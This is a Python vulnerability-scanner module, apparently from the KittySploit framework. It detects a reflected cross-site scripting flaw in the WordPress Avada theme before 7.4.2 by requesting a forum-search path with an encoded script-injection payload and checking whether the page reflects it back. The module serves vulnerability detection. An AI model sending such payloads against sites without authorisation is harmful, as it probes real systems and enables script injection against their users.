#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Avada Website Builder prior to 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Avada Website Builder <7.4.2 - Cross-Site Scripting Detection',
        'description': 'WordPress Avada Website Builder prior to 7.4.2 contains a cross-site scripting vulnerability. The theme does not properly escape bbPress searches before outputting them back as breadcrumbs.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'wp', 'wordpress', 'wp-theme', 'avada', 'wpscan', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/eb172b07-56ab-41ce-92a1-be38bab567cb',
            'https://theme-fusion.com/documentation/avada/installation-maintenance/avada-changelog/',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/forums/search/z-->%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"></script><script>alert(document.domain)</script>', 'avada-footer-scripts',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="WordPress Avada Website Builder <7.4.2 - Cross-Site Scripting detected",
                path='/forums/search/z-->%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/',
            )
            return True
        return False

